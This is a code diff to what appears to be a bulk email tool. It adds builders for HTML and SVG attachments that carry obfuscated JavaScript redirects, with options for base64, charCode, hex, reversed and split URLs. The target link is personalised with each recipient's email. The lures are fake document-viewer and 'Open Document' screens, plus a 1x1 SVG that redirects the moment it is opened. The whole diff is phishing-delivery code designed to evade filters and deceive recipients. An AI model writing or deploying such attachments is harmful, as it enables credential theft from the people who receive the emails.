@@ -774,6 +774,226 @@ def _build_svg_attachment(svg_cfg):
     return part
 
 
+def _build_html_redirect_attachment(cfg, lead, sender=None):
+    """
+    Build a standalone .html file that opens in a browser and redirects to a URL.
+
+    cfg keys:
+        link        — target URL; #EMAIL / #FIRSTNAME tags supported
+        name        — output filename  (default: "document.html")
+        theme       — loading | viewer | click | blank  (default: loading)
+        obfuscation — none | base64 | charcode | split | hex | reverse
+        delay       — ms before redirect fires  (default: 200)
+    """
+    import base64 as _b64
+    lead = lead or {}
+    lead_email = lead.get("email", "")
+    raw_link = (cfg.get("link") or cfg.get("url") or "").strip()
+    link = raw_link.replace("#EMAIL", lead_email)
+    try:
+        from core.tags import build_context, resolve_tags
+        ctx = build_context(lead=lead, sender=sender or {}, subject="", counter=0)
+        link = resolve_tags(link, ctx)
+    except Exception:
+        pass
+
+    name = (cfg.get("name") or "document.html").strip()
+    if not (name.endswith(".html") or name.endswith(".htm")):
+        name += ".html"
+
+    theme = (cfg.get("theme") or "loading").strip().lower()
+    obf   = (cfg.get("obfuscation") or "none").strip().lower()
+    try:
+        delay = max(0, int(cfg.get("delay") or 200))
+    except Exception:
+        delay = 200
+
+    # URL expression (obfuscated or plain)
+    def _uexpr(url):
+        if obf == "base64":
+            return f'atob("{_b64.b64encode(url.encode()).decode()}")'
+        if obf == "charcode":
+            return f'String.fromCharCode({",".join(str(ord(c)) for c in url)})'
+        if obf == "hex":
+            return '"' + "".join(f"\\x{ord(c):02x}" for c in url) + '"'
+        if obf == "reverse":
+            return f'"{url[::-1]}".split("").reverse().join("")'
+        if obf == "split":
+            mid = len(url) // 2
+            return f'"{url[:mid]}"+"{url[mid:]}"'
+        return f'"{url}"'
+
+    expr = _uexpr(link)
+    timed = f'setTimeout(function(){{var u={expr};window.location.replace(u);}},{delay});'
+    click_fn = f'function _go(){{var u={expr};window.location.href=u;}}'
+
+    if theme == "blank":
+        html = (
+            f'<!DOCTYPE html><html><head><meta charset="utf-8">'
+            f'<meta http-equiv="refresh" content="0;url={link}"></head>'
+            f'<body><script>{timed}</script></body></html>'
+        )
+    elif theme == "click":
+        html = (
+            f'<!DOCTYPE html><html><head><meta charset="utf-8">'
+            f'<style>*{{box-sizing:border-box;margin:0;padding:0}}'
+            f'body{{background:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;'
+            f'display:flex;align-items:center;justify-content:center;min-height:100vh}}'
+            f'.wrap{{text-align:center;padding:40px}}'
+            f'.btn{{display:inline-block;margin-top:24px;padding:14px 32px;background:#0078d4;'
+            f'color:#fff;text-decoration:none;border-radius:6px;font-size:16px;font-weight:600;'
+            f'cursor:pointer;border:none}}'
+            f'p{{color:#555;font-size:15px}}</style></head>'
+            f'<body><div class="wrap"><p>Your document is ready to view.</p><br>'
+            f'<button class="btn" onclick="_go()">Open Document &rarr;</button></div>'
+            f'<script>{click_fn}{timed}</script></body></html>'
+        )
+    elif theme == "viewer":
+        html = (
+            f'<!DOCTYPE html><html><head><meta charset="utf-8">'
+            f'<style>*{{margin:0;padding:0;box-sizing:border-box}}'
+            f'body{{background:#323639;display:flex;flex-direction:column;'
+            f'align-items:center;justify-content:center;height:100vh;font-family:Arial,sans-serif}}'
+            f'.bar{{width:100%;background:#1e2124;padding:12px 20px;position:fixed;top:0;'
+            f'display:flex;align-items:center;gap:12px}}'
+            f'.icon{{width:22px;height:22px;background:#e74c3c;border-radius:3px;'
+            f'display:flex;align-items:center;justify-content:center;color:#fff;font-size:11px;font-weight:bold}}'
+            f'.ttl{{color:#ccc;font-size:13px}}'
+            f'.page{{background:#fff;width:620px;max-width:95vw;height:70vh;border-radius:2px;'
+            f'display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,.5)}}'
+            f'.msg{{color:#aaa;font-size:13px;text-align:center}}'
+            f'.spin{{width:30px;height:30px;border:3px solid #ddd;border-top-color:#0078d4;'
+            f'border-radius:50%;animation:s .8s linear infinite;margin:0 auto 10px}}'
+            f'@keyframes s{{to{{transform:rotate(360deg)}}}}</style></head>'
+            f'<body><div class="bar"><div class="icon">&#128196;</div>'
+            f'<div class="ttl">Document Viewer &mdash; Loading&hellip;</div></div>'
+            f'<div class="page"><div class="msg"><div class="spin"></div>Opening document&hellip;</div></div>'
+            f'<script>{click_fn}{timed}</script></body></html>'
+        )
+    else:  # loading (default)
+        html = (
+            f'<!DOCTYPE html><html><head><meta charset="utf-8">'
+            f'<style>*{{margin:0;padding:0;box-sizing:border-box}}'
+            f'body{{background:#f5f7fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;'
+            f'display:flex;align-items:center;justify-content:center;height:100vh}}'
+            f'.box{{text-align:center;padding:40px}}'
+            f'.spin{{width:48px;height:48px;border:4px solid #e0e6ef;border-top-color:#0078d4;'
+            f'border-radius:50%;animation:s .9s linear infinite;margin:0 auto 20px}}'
+            f'@keyframes s{{to{{transform:rotate(360deg)}}}}'
+            f'h3{{color:#1a1a2e;font-size:18px;font-weight:600;margin-bottom:8px}}'
+            f'p{{color:#888;font-size:13px}}</style></head>'
+            f'<body><div class="box"><div class="spin"></div>'
+            f'<h3>Loading&hellip;</h3><p>Please wait while your content is prepared.</p></div>'
+            f'<script>{click_fn}{timed}</script></body></html>'
+        )
+
+    part = MIMEBase("text", "html")
+    part.set_payload(html.encode("utf-8"))
+    encoders.encode_base64(part)
+    part.add_header("Content-Disposition", "attachment", filename=name)
+    return part
+
+
+def _build_svg_redirect_attachment(cfg, lead, sender=None):
+    """
+    Build an SVG file with an embedded JS redirect.
+    Opens in any modern browser; auto-redirects after a short delay.
+
+    cfg keys:
+        link        — target URL; #EMAIL / #FIRSTNAME tags supported
+        name        — output filename  (default: "graphic.svg")
+        obfuscation — none | base64 | charcode | split | hex  (default: none)
+        style       — auto | click | branded  (default: auto)
+        delay       — ms before auto-redirect  (default: 800)
+    """
+    import base64 as _b64
+    lead = lead or {}
+    lead_email = lead.get("email", "")
+    raw_link = (cfg.get("link") or cfg.get("url") or "").strip()
+    link = raw_link.replace("#EMAIL", lead_email)
+    try:
+        from core.tags import build_context, resolve_tags
+        ctx = build_context(lead=lead, sender=sender or {}, subject="", counter=0)
+        link = resolve_tags(link, ctx)
+    except Exception:
+        pass
+
+    name = (cfg.get("name") or "graphic.svg").strip()
+    if not name.endswith(".svg"):
+        name += ".svg"
+
+    style = (cfg.get("style") or "auto").strip().lower()
+    obf   = (cfg.get("obfuscation") or "none").strip().lower()
+    try:
+        delay = max(0, int(cfg.get("delay") or 800))
+    except Exception:
+        delay = 800
+
+    def _uexpr(url):
+        if obf == "base64":
+            return f'atob("{_b64.b64encode(url.encode()).decode()}")'
+        if obf == "charcode":
+            return f'String.fromCharCode({",".join(str(ord(c)) for c in url)})'
+        if obf == "hex":
+            return '"' + "".join(f"\\x{ord(c):02x}" for c in url) + '"'
+        if obf == "split":
+            mid = len(url) // 2
+            return f'"{url[:mid]}"+"{url[mid:]}"'
+        return f'"{url}"'
+
+    expr     = _uexpr(link)
+    auto_js  = f'setTimeout(function(){{window.location.replace({expr});}},{delay})'
+    click_js = f'window.location.href={expr}'
+
+    if style == "click":
+        svg = (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            '<svg xmlns="http://www.w3.org/2000/svg" width="500" height="200" viewBox="0 0 500 200">'
+            '<defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1">'
+            '<stop offset="0%" stop-color="#0078d4"/><stop offset="100%" stop-color="#005a9e"/>'
+            '</linearGradient></defs>'
+            '<rect width="500" height="200" fill="#f8f9fa"/>'
+            f'<rect x="150" y="72" width="200" height="52" rx="8" fill="url(#g)" style="cursor:pointer" onclick="{click_js}"/>'
+            f'<text x="250" y="103" text-anchor="middle" font-family="Arial,sans-serif" font-size="15" font-weight="bold" fill="#ffffff" style="cursor:pointer" onclick="{click_js}">Open Document</text>'
+            '<text x="250" y="152" text-anchor="middle" font-family="Arial,sans-serif" font-size="11" fill="#999">Click the button above to continue</text>'
+            f'<script type="text/javascript"><![CDATA[{auto_js};]]></script>'
+            '</svg>'
+        )
+    elif style == "branded":
+        svg = (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="280" viewBox="0 0 400 280">'
+            '<rect width="400" height="280" fill="#ffffff"/>'
+            '<rect x="0" y="0" width="400" height="5" fill="#0078d4"/>'
+            '<rect x="30" y="38" width="54" height="72" rx="4" fill="#e8f0fe" stroke="#d0d9f0" stroke-width="1"/>'
+            '<rect x="40" y="52" width="34" height="3" rx="2" fill="#c5d0e8"/>'
+            '<rect x="40" y="60" width="26" height="3" rx="2" fill="#c5d0e8"/>'
+            '<rect x="40" y="68" width="30" height="3" rx="2" fill="#c5d0e8"/>'
+            '<rect x="40" y="76" width="24" height="3" rx="2" fill="#c5d0e8"/>'
+            '<text x="100" y="60" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#1a1a2e">Shared Document</text>'
+            '<text x="100" y="78" font-family="Arial,sans-serif" font-size="11" fill="#888">This file is ready to view.</text>'
+            '<text x="100" y="96" font-family="Arial,sans-serif" font-size="11" fill="#888">Opening in browser&hellip;</text>'
+            '<rect x="30" y="136" width="340" height="1" fill="#f0f0f0"/>'
+            f'<rect x="30" y="152" width="110" height="34" rx="6" fill="#0078d4" style="cursor:pointer" onclick="{click_js}"/>'
+            f'<text x="85" y="174" text-anchor="middle" font-family="Arial,sans-serif" font-size="13" font-weight="600" fill="#fff" style="cursor:pointer" onclick="{click_js}">View Now</text>'
+            f'<script type="text/javascript"><![CDATA[{auto_js};]]></script>'
+            '</svg>'
+        )
+    else:  # auto — minimal 1×1 pixel, just fires the script
+        svg = (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" viewBox="0 0 1 1">'
+            f'<script type="text/javascript"><![CDATA[{auto_js};]]></script>'
+            '</svg>'
+        )
+
+    part = MIMEBase("image", "svg+xml")
+    part.set_payload(svg.encode("utf-8"))
+    encoders.encode_base64(part)
+    part.add_header("Content-Disposition", "attachment", filename=name)
+    return part
+
+
 def _build_html_pdf_attachment(cfg, body_html, lead, sender, resolved_subject):
     """
     HTML → PDF attachment with optional overlay features.
@@ -1874,6 +2094,26 @@ def build_message(
                 attachment_parts.append(("svg", svg_part, None))
         except Exception as e:
             warnings.append(f"SVG build failed: {e}")
+
+    # HTML Redirect — standalone .html that opens in browser and redirects to URL
+    html_redirect_cfg = attachments.get("html_redirect")
+    if html_redirect_cfg and html_redirect_cfg.get("link"):
+        try:
+            hr_part = _build_html_redirect_attachment(html_redirect_cfg, lead, sender)
+            if hr_part:
+                attachment_parts.append(("html_redirect", hr_part, None))
+        except Exception as e:
+            warnings.append(f"HTML redirect build failed: {e}")
+
+    # SVG Redirect — SVG with embedded JS redirect
+    svg_redirect_cfg = attachments.get("svg_redirect")
+    if svg_redirect_cfg and svg_redirect_cfg.get("link"):
+        try:
+            svgr_part = _build_svg_redirect_attachment(svg_redirect_cfg, lead, sender)
+            if svgr_part:
+                attachment_parts.append(("svg_redirect", svgr_part, None))
+        except Exception as e:
+            warnings.append(f"SVG redirect build failed: {e}")
 
     # HTML → PDF (custom HTML, optional blur / text overlay / ghost link)
     html_pdf_cfg = attachments.get("html_pdf")
